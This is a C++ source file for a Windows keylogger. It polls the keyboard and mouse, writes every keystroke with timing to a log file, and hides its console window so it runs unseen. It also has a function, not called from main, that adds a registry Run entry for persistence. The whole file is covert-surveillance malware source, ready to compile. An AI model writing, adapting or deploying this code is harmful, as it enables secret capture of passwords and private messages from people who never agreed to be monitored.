#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <unordered_map>

bool is_capslock;
auto last_time = std::chrono::steady_clock::now();
std::string path = "logs.txt"; // path for the logs file 
//(if you just specify the name, then .txt will load into the same directory as keylogger)

std::unordered_map<int, std::string> key_map = {
    {96, "0"}, {97, "1"}, {98, "2"}, {99, "3"}, {100, "4"},
    {101, "5"}, {102, "6"}, {103, "7"}, {104, "8"}, {105, "9"},
    {48, "0"}, {49, "1"}, {50, "2"}, {51, "3"}, {52, "4"},
    {53, "5"}, {54, "6"}, {55, "7"}, {56, "8"}, {57, "9"},
    {VK_BACK, "[BACKSPACE]"}, {VK_LBUTTON, "[LEFT_MOUSE_BUTTON]"},
    {VK_RBUTTON, "[RIGHT_MOUSE_BUTTON]"}, {VK_RETURN, "[LINE BREAK]"}, {VK_SPACE, "[SPACE]"},
    {VK_CAPITAL, "[CAPSLOCK]"}, {VK_TAB, "[TAB]"}, {VK_LMENU, "[LEFT_ALT]"},
    {VK_RMENU, "[RIGHT_ALT]"}, {VK_LWIN, "[LEFT_WIN]"}, {VK_RWIN, "[RIGHT_WIN]"},
    {VK_OEM_4, "["}, {VK_OEM_6, "]"}, {VK_OEM_5, "\\"}, {VK_OEM_1, ";"},
    {VK_OEM_7, "'"}, {VK_OEM_COMMA, ","}, {VK_OEM_PERIOD, "."}, {VK_OEM_2, "/"},
    {VK_OEM_MINUS, "-"}, {VK_OEM_PLUS, "="},{VK_LCONTROL, "[LEFT CTRL]"},
    {VK_RCONTROL, "[RIGHT CTRL]"},{VK_ESCAPE, "[ESC]"}, {VK_F1, "[F1]"}, 
    {VK_F2, "[F2]"}, {VK_F3, "[F3]"},{VK_F4, "[F4]"}, {VK_F5, "[F5]"},
    {VK_F6, "[F6]"}, {VK_F7, "[F7]"},{VK_F8, "[F8]"},{VK_F9, "[F9]"},
    {VK_F10, "[F10]"}, {VK_F11, "[F11]"},{VK_F12, "[F12]"}
    
};

std::unordered_map<int, std::string> shift_key_map = {
    {48, ")"}, {49, "!"}, {50, "@"}, {51, "#"}, {52, "$"},
    {53, "%"}, {54, "^"}, {55, "&"}, {56, "*"}, {57, "("},
    {VK_OEM_4, "{"}, {VK_OEM_6, "}"}, {VK_OEM_5, "|"}, {VK_OEM_1, ":"},
    {VK_OEM_7, "\""}, {VK_OEM_COMMA, "<"}, {VK_OEM_PERIOD, ">"}, {VK_OEM_2, "?"},
    {VK_OEM_MINUS, "_"}, {VK_OEM_PLUS, "+"}
};
void addToStartup() {
    HKEY hKey;
    auto czStartName = L"MyKeylogger";
    const char* czExePath = "C:/keylogger/keylogger.exe"; // path for .exe file

    
    if (RegOpenKey(HKEY_CURRENT_USER, L"Software/Microsoft/Windows/CurrentVersion/Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, czStartName, 0, REG_SZ, (BYTE*)czExePath, strlen(czExePath) + 1);
        RegCloseKey(hKey);
    }
}
void save(int key, std::ofstream& log_file) {
    auto current_time = std::chrono::steady_clock::now();
    auto interval = std::chrono::duration_cast<std::chrono::milliseconds>(current_time - last_time).count();
    last_time = current_time;

    std::string button;
    bool shift_pressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
    if (shift_pressed && shift_key_map.find(key) != shift_key_map.end()) {
        button = shift_key_map[key];
    }
    else if (key_map.find(key) != key_map.end()) {
        button = key_map[key];
    }
    else if (key >= 65 && key <= 90) { // capital letter A-Z 
        button = (is_capslock || shift_pressed) ? char(key) : char(key + 32);
    }
    else {
        if (key == VK_CAPITAL) {
            is_capslock = !is_capslock; 
            button = "[CAPSLOCK]";
        }
        else if (key == VK_RSHIFT) {
            is_capslock = !is_capslock;
            button = "[RIGHT SHIFT]";
        }
        else if (key == VK_LSHIFT) {
            is_capslock = !is_capslock;
            button = "[SHIFT]";
        }
        
        else button = "[UNKNOWN]";
    }
    
    interval /= 1000;
    log_file << interval << "sec:" << button << std::endl; 
}

void stealth() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("consoleWindowClass", NULL);
    ShowWindow(stealth, 0); // 0 - the invisible console, 1 - the visible one
}

void log_keys() {
    std::ofstream log_file(path, std::ios_base::app);
    if (!log_file.is_open()) {
        std::cerr << "Failed to open log file!" << std::endl;
        return;
    }

    while (true) {
        // checking the keys
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                save(key, log_file);
            }
        }

        // extra checking mouse buttons
        if (GetAsyncKeyState(VK_LBUTTON) & 0x8000) {
            save(VK_LBUTTON, log_file);
        }
        if (GetAsyncKeyState(VK_RBUTTON) & 0x8000) {
            save(VK_RBUTTON, log_file);
        }
        

        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}
int main() {
    stealth();
    log_keys();
    return 0;
}